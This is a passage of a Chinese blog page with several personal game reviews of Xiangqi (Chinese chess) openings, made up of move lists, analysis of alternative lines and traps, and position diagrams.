<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410234145196.png" alt="image-20250410234145196" style="zoom:50%;" />

<p>此时红方应该不予理睬，冲中兵或者进左马盘河或者出左横车均可以。<br>​但是出左边车马没有明确打击目标，不如冲中兵徐图进展。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410234625162.png" alt="image-20250410234625162" style="zoom:50%;" />

<p><strong>&lt;3&gt;</strong> 如果黑走🚗1平8</p>
<p>黑方的目的是用霸王车解决左翼无根车炮问题，显然如果黑方解开了对红方不利</p>
<ol start="10">
<li><p>马四进五 车1平8</p>
</li>
<li><p>马五进三 前车平7</p>
</li>
<li><p>马三退四</p>
</li>
</ol>
<p>红方成功骚扰黑方的霸王车计划，调整马位准备进六，接下来有挂角和瞄2路炮过七兵两个进攻矛头。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411000125937.png" alt="image-20250411000125937" style="zoom:50%;" />

<p>（1）黑方如果执意要走霸王车，车8进1</p>
<p>红马四进六，准备挂角抽车，同时红马瞪着黑2路炮，红七兵渡河时机已到<br>此时黑方只有落象才能同时解决两个问题<br>红炮八退一，准备再平五立空头炮.<br>由于红马随时挂角抽车，黑方右炮必须防守住挂角点，因此黑无法补中象<br>到此黑方已经无力抵抗了</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411000652703.png" alt="image-20250411000652703" style="zoom:50%;" />

<p>（2）黑方没有比较好的走法，只能走车7平6.</p>
<p>红马四进六，还是要过七兵<br>黑只能炮2退1或者退2<br>慢慢冲中兵就可以了</p>
<p>如果在第7回合黑马没有换掉红中炮，也就是实战黑的走法。</p>
</blockquote>
<blockquote>
<p>（2）马七进六</p>
<ol start="7">
<li>马七进六 车1进1 ，这里黑方并没有立刻补象，勾引红方立刻进攻</li>
</ol>
<p>此时红河口马，中炮，右车对黑中卒虎视眈眈，但是黑中卒只有一批右马防御，势单力薄。</p>
<p>I. 红方想立刻马六进五，等黑马3进5换马，红炮五进四立上空头炮。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411002210999.png" alt="image-20250411002210999" style="zoom:50%;" />

<p>然而这只是红方一厢情愿</p>
<p>当红马四进五后，黑马7进5，把红最具有威胁的中炮换掉，如果红方不理睬黑马，则马5进3卧槽抽车。因此红必须飞象吃马，此时黑马3进5换马，红车二平五换马。</p>
<p>黑方顺势炮8平5还架中炮，解决了左路无根车炮问题。双方势均力敌，黑方足以满意。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411002629216.png" alt="image-20250411002629216" style="zoom:50%;" />

<p>II. 因此时机尚未成熟，如果红方还想要维持中路攻势，还是得走炮八进四，这样就走到了和先走炮八进四同样的局面。然而此时红方除了炮八进四，还有两种进攻手段，但是都不理想。</p>
<p>a.炮五退一 （避免红马前进激战时后炮起火）</p>
<p>b.兵七进一 （基于黑车1进1，底象失守）</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411004154916.png" alt="image-20250411004154916" style="zoom: 50%;" />

<p>a,炮五退一</p>
<p>炮五退一就是预见到当红马六进五时，黑先不换马，二是先马7进5换炮。<br>因此红方先退避三舍，避免黑马换炮。	</p>
<pre><code>  8.    炮五退一 象7进5		

  9.    马六进五 马3进5

  10.    炮五进五 士4进5
</code></pre>
<p>到此红立了一个中炮，但是黑车出的快，红方略微优势，前路漫长</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411005646904.png" alt="image-20250411005646904" style="zoom:50%;" />

<p>b.兵七进一</p>
<p>红方想的是黑车离开底线，底象没人管，先送一个兵然后套炮打马打象。</p>
<p>黑方马退窝心时中炮再打过去立当头炮。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411010031184.png" alt="image-20250411010031184" style="zoom: 67%;" />

<p>然而黑方7马随时可以换掉中炮，化解红方中炮攻势</p>
<ol start="8">
<li><p>兵七进一 卒3进1</p>
</li>
<li><p>炮八平七 马7进5！</p>
</li>
<li><p>马六退五！ 马3退5</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411010618723.png" alt="image-20250411010618723" style="zoom:50%;" />

<p>注意到第10回合红方没有用相飞马，而是盘河马杀回来，</p>
<p>这是因为黑有车1平4对抓马的手段。</p>
<p>红方如果用相飞马，黑方应该立刻对抓马。利用这个对抓，黑方可以获得一些先手。</p>
<p>若黑方软弱走马3退5，则红马六进五蹬鼻子上脸优势巨大</p>
</blockquote>
<blockquote>
<p>(3)兵五进一</p>
<p>红方采用急进中兵的思路。</p>
<p>急进中兵局面如右图所示，而当前局面如左图所示。</p>
<p>左图中红方左马已经跳起，黑左马以离开防务，屏风马结构遭到破坏，2路无根车炮被牵制。</p>
<p>因此相比于急进中兵标准棋谱，当前局面下红方的优势更大。</p>
<p>如果说急进中兵双方各有千秋，那么当前局面下红方的千秋貌似更多一点。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411011902184.png" alt="左：当前局面  右：急进中兵"></p>
<ol start="7">
<li><p>兵五进一 士4进5， 此时不能马7退5踩兵因为红可以炮八进二打死马</p>
</li>
<li><p>马三进五！ 象3进5，直接抬横车和出贴身车一样快，能多上步象更好</p>
</li>
<li><p>兵五进一 …</p>
</li>
</ol>
<p>此时黑方有两种走法，卒5进1&#x2F;车1平4</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411014313402.png" alt="image-20250411014313402" style="zoom:50%;" />

<p>I.卒5进1</p>
<ol start="9">
<li><p>兵五进一 卒5进1</p>
</li>
<li><p>炮五进三 车1平4</p>
</li>
<li><p>车九进一 车4进6，黑方接下来想要炮2进4打红马</p>
</li>
<li><p>车九平三！ 马7退5 ，红方先抓马，黑方来不及套炮打马，因此红车杀马之后就看住了红马</p>
</li>
<li><p>炮八进二！ 马5进3， 红炮打马又得到先手，调整了炮位，也阻止了黑2路炮渗透的可能。</p>
</li>
<li><p>车三进四 将5平4</p>
</li>
</ol>
<p>至此红方获得巨大优势，接下来车三退一，炮五平四再退二打死马。注意这里黑方可能埋伏一个软件招</p>
<ol start="15">
<li><p>车三退一 卒1进1，假设黑方随便走了无关紧要的一步</p>
</li>
<li><p>炮五平四 象5进7！，这步飞象让人很难理解其目的 </p>
</li>
<li><p>炮五退二？ 车4平5！，黑车为什么敢换马？</p>
</li>
<li><p>马七进五 炮8平5！，原来之前黑方诡异的飞象，是给中炮腾地方，抽吃红二路车</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411020301215.png" alt="image-20250411020301215" style="zoom:67%;" />

<p>II. 车1平4</p>
<p>黑抢出车，不管中路</p>
<ol start="9">
<li><p>兵五进一 车1平4</p>
</li>
<li><p>兵五进一 车4进6，黑方接下来要炮2进4打马了</p>
</li>
</ol>
<p>红方看起来有很多走法，</p>
<p>炮八进二&#x2F;车九进一&#x2F;炮五平四&#x2F;兵五进一</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411021152270.png" alt="image-20250411021152270" style="zoom:50%;" />

<p>① 炮八进二是错着，黑马7进6同时踩红马，挂角。红马五进四后黑马6退4挂角将军，请帅上楼。然后黑右马仗势欺人往上跳，红如果吃黑马则黑左侧车炮可以下底威胁</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411021635359.png" alt="image-20250411021635359" style="zoom:50%;" />

<p>②车九进一也是错着，黑方炮2进4得子</p>
<p>③炮五平四是正着，黑来不及套炮，因为红也可以套炮打车</p>
<ol start="11">
<li>炮五平四 卒3进1，黑看似无棋可走，于是冲3卒活马。然而黑的目的真的是活🐎吗？</li>
</ol>
<p>假设红方没有察觉黑意图，接收了兑兵，先走了兵七进一：</p>
<ol start="12">
<li><p>兵七进一 象5进3</p>
</li>
<li><p>炮四退一 车4退5</p>
</li>
<li><p><strong>车九进一</strong> 炮2进1！，打车！</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411022937850.png" alt="image-20250411022937850" style="zoom:67%;" />

<p>如果红兵五进一，则黑炮2平5将军，然后象3退5白坑一兵</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023115040.png" alt="image-20250411023115040" style="zoom: 67%;" />

<p>如果红车二退三，想要捉一批死马，然而自己成了死车<br>​车二退三，马3进5<br>​车二平三，炮8平7！，打死红车</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023216340.png" alt="image-20250411023216340" style="zoom: 67%;" />

<p>那么红在第14回合不走车九进一能挽救吗？<br>走兵五平六，当炮2进1时，再兵六进一得子不行吗？<br>然而此时黑中象已经飞离了，腾出了炮位，黑可以平炮将军抽车</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023534773.png" alt="image-20250411023534773" style="zoom: 67%;" />

<p>这中象什么时候飞离的？</p>
<p>在第11回合时黑卒3进1兑兵，</p>
<p>在第12回合红接收了兑兵，导致黑方飞高象。</p>
<p>这样就理解了黑冲3卒的真正目的，是一个圈套。</p>
<p>一旦红方上套则局势逆转。</p>
<p>第14回合红如果不走车九进一，改走象七进五也可以降低损失，</p>
<p>此时红方平中炮没有将军的先手，</p>
<p>黑需要先躲一步炮，红兵可以再啃一个中士</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411025142742.png" alt="image-20250411025142742" style="zoom: 67%;" />

<p>然而当红飞中象后，黑也知道圈套作用不大了，也不会再炮2进1，</p>
<p>而是改走卒7进1 ，准备平6威胁红炮红马</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411025432076.png" alt="image-20250411025432076" style="zoom: 67%;" />

<p>也就是说第14回合，红抬红车则落入黑方圈套。红飞中象则黑过兵反击。</p>
<p>总之第12回合红接收兑兵就被黑方算计了</p>
<ol start="12">
<li>炮四进一，车4退6！，注意这里黑车退6，而在刚才的圈套里黑车退5</li>
</ol>
<p>这是为了防止红兵五平六再进一拱到黑车，所以他跑的远一点儿</p>
<p>此时有两种走法：兵五平六&#x2F;兵七进一</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411024337199.png" alt="image-20250411024337199" style="zoom: 67%;" />

<p>如果走兵七进一，</p>
<ol start="13">
<li>兵七进一 象5进3，腾出了炮位</li>
</ol>
<p>象七进五 炮2进1，和刚才的圈套一模一样</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411024822521.png" alt="image-20250411024822521" style="zoom: 67%;" />

<p>如果走兵五平六</p>
<ol start="13">
<li><p>兵五平六 卒3进1</p>
</li>
<li><p>兵六平七！ 马3退2</p>
</li>
</ol>
<p>红兵六平七压马是正手，黑3卒并不着急吃，他也冲不下来，因为红四路炮架着呢。而红兵六平七压马就防止了黑马3进4出来骚扰。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411030414492.png" alt="image-20250411030414492" style="zoom: 67%;" />

<ol start="15">
<li><p>马五进七 卒7进1 ，到此红方已经取得巨大优势</p>
</li>
<li><p>直接兵五平六行不行？</p>
</li>
</ol>
<p>为什么一定要先炮四进一赶走黑车再兵五平六？</p>
<p>直接平行不行？</p>
<p>不行！</p>
<ol start="12">
<li>兵五平六 象5退3！马上就要炮8平5抽红车！红必须补象</li>
<li>象七进五 炮2进4！此时炮打马带将军，红方来不及炮四进一打车了！</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411031038939.png" alt="image-20250411031038939" style="zoom: 67%;" />

<p>④兵五进一继续冲</p>
<ol start="11">
<li>兵五进一 象7进5，黑方必须得飞红兵，否则他狠狠捅进来了受不了</li>
<li>炮八平九 炮2进4？ 假设黑方认为仍然可以套炮打红中马</li>
<li>炮五进五！将5平4</li>
<li>士六进五！炮2平5， 这里红<strong>补士是正确的，补象就坏了</strong>，后面黑可以一马换双象然后双车借将破双士。</li>
<li>马七进五 车4平5</li>
<li>车二平六！士5进4，由于红炮当头，黑将没法回去，只能补士</li>
<li>炮五平七 炮8平3</li>
<li>车六进一 将4平5</li>
<li>车六平七  得回失子</li>
</ol>
</blockquote>
<ol start="7">
<li><p>炮八进四 象７进５</p>
</li>
<li><p>炮五进四 士4进5</p>
</li>
</ol>
<blockquote>
<p>接下来红方为了保持攻势，应该炮五退一，避免马踩。<strong>同时一个新的作战计划浮出水面。</strong></p>
<p>如果这一步黑方没有察觉，比如随手抬右横车，则红兵七进一，引诱黑卒3进1白得一兵。</p>
<p>炮八平三，打马</p>
<p>卒7进1，看马</p>
<p>车二进一，硬砍炮，如果黑车8进2杀红车则红炮三进三，天地炮闷宫。</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410222421895.png" alt="image-20250410222421895" style="zoom: 67%;" />

<p>完整推演：</p>
<ol start="9">
<li><p>炮五退一 车1进1？</p>
</li>
<li><p>兵七进一！ 卒3进1</p>
</li>
<li><p>炮八平三！卒7进1</p>
</li>
<li><p>车二进一！ 车8平7</p>
</li>
<li><p>炮三进一！打串！</p>
</li>
</ol>
<p>也就是说第9回合，黑方必须走出关键的一步，马3退4，形成担子炮不怕红二路车杀炮了。</p>
<p>然而这步我是想不到的。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/11/[%E8%B1%A1%E6%A3%8B%E5%A4%8D%E7%9B%98]%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%20%E5%AF%B9%20%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/11/%5B%E8%B1%A1%E6%A3%8B%E5%A4%8D%E7%9B%98%5D%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%20%E5%AF%B9%20%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/" class="post-title-link" itemprop="url">中炮过河车互进七兵 对 屏风马左马盘河 红七路马 复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-11 03:00:00 / Modified: 03:36:20" itemprop="dateCreated datePublished" datetime="2025-04-11T03:00:00+08:00">2025-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="复盘-中炮过河车互进七兵-对-屏风马左马盘河-红七路马"><a href="#复盘-中炮过河车互进七兵-对-屏风马左马盘河-红七路马" class="headerlink" title="[复盘] 中炮过河车互进七兵 对 屏风马左马盘河 - 红七路马"></a>[复盘] 中炮过河车互进七兵 对 屏风马左马盘河 - 红七路马</h1><h2 id="对局记录"><a href="#对局记录" class="headerlink" title="对局记录"></a>对局记录</h2><ol>
<li>炮二平五 马８进７</li>
<li>马二进三 卒７进１</li>
<li>车一平二 车９平８</li>
<li>车二进六 马２进３</li>
<li>兵七进一 马７进６</li>
<li>马八进七 卒７进１</li>
<li>车二平四 马６进８</li>
<li>兵三进一 马８进７</li>
<li>炮五进四 马３进５</li>
<li>车四平五 炮８平５</li>
<li>炮八平三 炮２进１</li>
<li>车五退二 炮２退２</li>
<li>相七进五 炮２平５</li>
<li>车五平四 车１平２</li>
<li>车九进一 象７进９</li>
<li>车九平六 车２进６</li>
<li>车四平六 后炮进５</li>
<li>马七进五 士６进５</li>
<li>后车进二 车２进２</li>
<li>仕六进五 车８进６</li>
<li>马五进四 车２进１</li>
<li>后车退三 车２平４</li>
<li>帅五平六 炮５平４</li>
<li>车六平五 车８平１</li>
<li>马四进二 车１进３</li>
<li>帅六进一 炮４退１</li>
<li>马二进四</li>
</ol>
<h2 id="复盘分析"><a href="#复盘分析" class="headerlink" title="复盘分析"></a>复盘分析</h2><ol>
<li>炮二平五 马８进７</li>
<li>马二进三 卒７进１</li>
<li>车一平二 车９平８</li>
<li>车二进六 马２进３</li>
<li>兵七进一 马７进６</li>
<li>马八进七 …</li>
</ol>
<blockquote>
<p>到此, 双方都一直走的正着, 至此形成局面 <strong>中炮过河车互进七兵对屏风马左马盘河 — 红七路马</strong></p>
<p>在此局面下, 如果我执黑方, 我可能的走法有:</p>
<p>(1)卒7进1 , 也就是实战中的下法</p>
<p>(2)马6进7 , 红可左马盘河, 联合中炮攻击中卒, 并且黑马6进7可能最大的作用就是换掉中炮, 比较亏步数</p>
<p>(3)象3进5 , 可以走</p>
<p>(4)象7进5 , 可以走</p>
<p>(5)车1进1 , 可以走</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408164518149.png" alt="image-20250408164518149"></p>
<p>实战中红方采用马八进七, 目的是不让黑马6进4.</p>
<p>这里红上马看似顾此失彼, 引诱黑方走卒7进1这步棋, 想的是蹬车同时过兵反击. 然而这是红方设计的布局陷阱. </p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Z4411R7xh?vd_source=439dc31ae7afb665ee549d8bb78a939c&p=3&spm_id_from=333.788.videopod.episodes">2-2 黑主要变例（上）–黑劣变的攻击_哔哩哔哩_bilibili</a></p>
<p>这里黑方正手是补一下7象或者3象 中路加厚一层就可以破解红方的陷阱, 或者不予理睬抬右横车</p>
<p>实战黑方没有补象, 直接冲7卒反击, 时机尚未成熟, 缺一手补象使得黑中路有被炮轰空头或者车杀卒将军的风险.</p>
</blockquote>
<ol start="6">
<li>马八进七 卒７进１</li>
</ol>
<blockquote>
<p>这里黑方冲7卒反击, 时机尚未成熟, 黑中防并不踏实</p>
</blockquote>
<ol start="7">
<li>车二平四 马６进８</li>
</ol>
<blockquote>
<p>这里貌似红三路兵马十分被动,然而实际不然, 红可以直接挺三兵, 弃三马. 接下来炮轰中卒</p>
<p>​	如果黑3马换掉中炮, 那么车杀马带将军, 红左炮抽回失子</p>
<p>​	如果黑3马不换中炮, 那么黑还需要花费一步棋逃走7马, 红方弃掉一马得到一个空头炮, 红大优</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408181346573.png" alt="image-20250408181346573"></p>
</blockquote>
<ol start="8">
<li>兵三进一 马８进７</li>
<li>炮五进四 马３进５</li>
<li>车四平五 炮８平５</li>
</ol>
<blockquote>
<p>黑这步平炮是错招, 本来黑还有炮8进7的反击手段. 甚至不如炮2平5.</p>
<p>当时黑方应该是想平8炮亮车然后抬车欺负红车. 应该是杀红眼了想立刻发泄一下.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408184749466.png" alt="image-20250408184749466"></p>
<p>黑方正手应该走士6进5, 保留右炮平中或者左移的变化. 并可以在红右翼反击.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408185345530.png" alt="image-20250408185345530"></p>
</blockquote>
<ol start="11">
<li>炮八平三 炮２进１</li>
</ol>
<blockquote>
<p>此局面下, 红中路空虚, 中车不能离开, 只能退一或者退二避让.</p>
<p>当时走了退二, 没走退一, 是害怕黑车8进4再捉, 会帮助黑方出车.</p>
<p>然而实际上不用怕, 红可炮轰底象然后再退四格挡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408190114485.png" alt="image-20250408190114485"></p>
</blockquote>
<ol start="12">
<li><p>车五退二 炮２退２</p>
</li>
<li><p>相七进五 炮２平５</p>
</li>
<li><p>车五平四 车１平２</p>
</li>
<li><p>车九进一 象７进９</p>
</li>
</ol>
<blockquote>
<p>此时红车九进一, 目的是再平四或者平六, 霸王车捅底士</p>
<p>此时黑飞象7进9也是正确的, 既消除了红炮三进七的手段, 也用8路车看住了6路士</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408190613200.png" alt="image-20250408190613200"></p>
</blockquote>
<ol start="16">
<li>车九平六 车２进６</li>
</ol>
<blockquote>
<p>此时红车九平六,打算在六路叠霸王车狠狠捅进去</p>
<p>黑走车2进6是错招, 黑2路车应该留守底线, 此时黑已经无法阻止有力的反击了, 随便走着玩吧</p>
<p>实战黑走车2进6, 考虑到中路有两炮, 想要从中路发起攻势, 然而这是错招. 红可直接车四平六叠霸王车, 无视黑反击, 现在捅下去就是杀. </p>
<p>即使黑中炮打出来将一军, 红只需要马换掉中炮, 此时霸王车捅下去还是杀, 黑来不及车2平5吃马, 必须先士6进5补一下.黑方白给一个炮, 可以投降了.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408191621029.png" alt="image-20250408191621029"></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/08/delicious/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/08/delicious/" class="post-title-link" itemprop="url">顺炮直车对横车 红过河车 复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-08 03:00:00 / Modified: 03:36:21" itemprop="dateCreated datePublished" datetime="2025-04-08T03:00:00+08:00">2025-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="象棋复盘-顺炮直车对横车-红过河车"><a href="#象棋复盘-顺炮直车对横车-红过河车" class="headerlink" title="[象棋复盘] 顺炮直车对横车 红过河车"></a>[象棋复盘] 顺炮直车对横车 红过河车</h1><h2 id="对局记录"><a href="#对局记录" class="headerlink" title="对局记录"></a>对局记录</h2><ol>
<li><p>炮二平五 炮８平５</p>
</li>
<li><p>马二进三 马８进７</p>
</li>
<li><p>车一平二 车９进１</p>
</li>
<li><p>车二进六 车９平４</p>
</li>
<li><p>仕四进五 车４进７</p>
</li>
<li><p>马八进九 车４平２</p>
</li>
<li><p>炮八平六 车１进１</p>
</li>
<li><p>炮六进五 炮５退１</p>
</li>
<li><p>车二平三 炮５平７</p>
</li>
<li><p>车三平四 士４进５</p>
</li>
<li><p>炮六退三 车１平４</p>
</li>
<li><p>炮六平三 炮７进４</p>
</li>
<li><p>兵三进一 车４进３</p>
</li>
<li><p>兵七进一 象３进５</p>
</li>
<li><p>马九进七 车２退２</p>
</li>
<li><p>马七进五 车４平６</p>
</li>
<li><p>兵三进一 车６退１</p>
</li>
<li><p>马五进四 车２退２</p>
</li>
<li><p>马四进三 将５平４</p>
</li>
<li><p>炮五平六 炮２退１</p>
</li>
<li><p>前马进一 象５进７</p>
</li>
<li><p>马三进四 将４平５</p>
</li>
<li><p>炮六平三 象７退５</p>
</li>
<li><p>相三进五 炮２平３</p>
</li>
<li><p>相七进九 马２进３</p>
</li>
<li><p>兵九进一 车２平６</p>
</li>
</ol>
<h2 id="复盘分析"><a href="#复盘分析" class="headerlink" title="复盘分析"></a>复盘分析</h2><ol>
<li>炮二平五 炮８平５</li>
<li>马二进三 马８进７</li>
<li>车一平二 车９进１</li>
<li>车二进六 车９平４</li>
<li>仕四进五 车４进７</li>
<li>马八进九  …</li>
</ol>
<blockquote>
<p>到此双方走的都是正着，这里红走了一边马，害怕上正马被黑车平抠</p>
<p>实际上红完全可以上正马，当黑平车抠马时红左炮巡河暗保马，如果黑吃马, 红就有炮八平七打车打底象的双响炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408002348491.png" alt="image-20250408002348491"></p>
</blockquote>
<ol start="6">
<li>…  车４平２</li>
</ol>
<blockquote>
<p>黑方左车急得跟马一样钻到红方被窝里，目的是单边封锁</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408001958158.png" alt="image-20250408001958158"></p>
<p>黑方捉炮同时单边封锁红左车。然而此时红方不怕封锁，可以直接出左直车邀兑，看似会多丢一批马，但是实际上是一个先弃后取，黑右炮打出使得左马脱根，黑左马是个死马。推演如下：</p>
<p>7.车九平八 车2进1</p>
<p>8.马九退八 炮2进7  ，这里黑方大概率会打马，因为黑车已经千里迢迢报废了，步数上血亏，因此杀个马获取补偿</p>
<p>9.车二平三 马7退8 ， 如果黑马退窝心则铁门栓速摆，如果黑马7退9则红炮五进四，士4进5，炮八进六，黑马被捉死</p>
<p>10.车三进三 马8进9</p>
<p>11.炮五进四 士4进5</p>
<p>12.帅五平四 将5平4 ，红借帅做铁门栓，逼迫黑将出门</p>
<p>13.炮五进二，至此红方少一个马，但是黑方家里已经被拆烂了，黑方守不住</p>
<p>这个布局陷阱在 布局疑形与攻击 - 第一章 顺手炮类 - 第10局 突发冷箭</p>
</blockquote>
<ol start="7">
<li>炮八平六 车１进１</li>
</ol>
<blockquote>
<p>这里红方看似简单躲了一步炮，实际上是想再进五打马，让黑中卒失守，再把中炮打过去</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408004926239.png" alt="image-20250408004926239"></p>
<p>我当时没考虑到这种意图，走车1进1，打算再平6出车，实际上这步出车也没有明确的目的。红可以车二平三压马，后续可以套炮或者进三兵攻击黑7路，黑左车不在家防守，黑7路将会十分被动。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408005829699.png" alt="image-20250408005829699"></p>
<p>因此此时黑最好应该走卒7进1，此时如果红还要车二平三压马，那么黑正好有时间抬横车平4然后伺机巡河守住，红来不及升巡河炮，红进三兵也可以被黑车象一起守住</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010144595.png" alt="image-20250408010144595"></p>
<p>还有一个问题是，在第6回合这里，黑方能否走马2进1？显然不能了，道理和走车1进1一样，缓一步棋使得7路马更加被动，并且车还没出来没法过去支援，更加被动</p>
</blockquote>
<ol start="8">
<li>炮六进五 炮５退１</li>
</ol>
<blockquote>
<p>当红炮六进五突袭后，吓我一跳。</p>
<p>当时想了三个应发，分别是士4进5&#x2F;车1平4&#x2F;炮5退1</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010835895.png" alt="image-20250408010835895"></p>
<p>（1） 士4进5</p>
<ol start="8">
<li><p>炮六进五 士4进5</p>
</li>
<li><p>炮六平三 炮2平7</p>
</li>
<li><p>车二平三 炮7平6</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025634437.png" alt="image-20250408025634437"></p>
<p>到此黑方的单边封锁失败，中卒和底象都失守，显然红优</p>
<p>（2）车1平4</p>
<ol start="8">
<li><p>炮六进五 车1平4</p>
</li>
<li><p>炮六平三 炮2平7</p>
</li>
<li><p>车二平三 炮7退1</p>
</li>
<li><p>炮五进四 炮7平5</p>
</li>
<li><p>炮五进二 车2平4 ，铁门栓抢一步先手，形成霸王车</p>
</li>
<li><p>相三进五 士4进5</p>
</li>
<li><p>马三退四 后车进2 ， 目的是兑车保护卒林</p>
</li>
<li><p>车三平六 车4退5</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408012359252.png" alt="image-20250408012359252"></p>
</li>
</ol>
<p>接下来红出直车先手抓马，红有多两个兵的优势。但是感觉大概率是和棋了</p>
</blockquote>
<ol start="9">
<li>车二平三 炮５平７</li>
</ol>
<blockquote>
<p>红方此时杀卒压马是错着，黑恰好可以炮5平7打车，红方失先</p>
</blockquote>
<ol start="10">
<li>车三平四 士４进５</li>
</ol>
<blockquote>
<p>红车三平四之后，此时是黑方最关键的一步棋，当时想到了四种走法：</p>
<p>士4进5&#x2F;马7进8&#x2F;炮7进5&#x2F;车1平4</p>
<p>士4进5很平庸，不至于失败，但是依旧消极防御</p>
<p>炮7进5&#x2F;马7进8&#x2F;车1平4都是有力的反击，能够化解红方的攻势</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408013139080.png" alt="image-20250408013139080"></p>
<p>（1）士4进5，目的是驱赶红炮，同时补厚中路。也正是实战中我走出的一步。但是没有对冲红方的攻势，仍然在消极防御。</p>
<p>（2）马7进8，当时没敢走这一步，害怕此步导致中卒失守，红直接弃车炮五进四，眼见就要重炮杀，黑马还对退回盯住红后炮，或者黑需要上将解杀。</p>
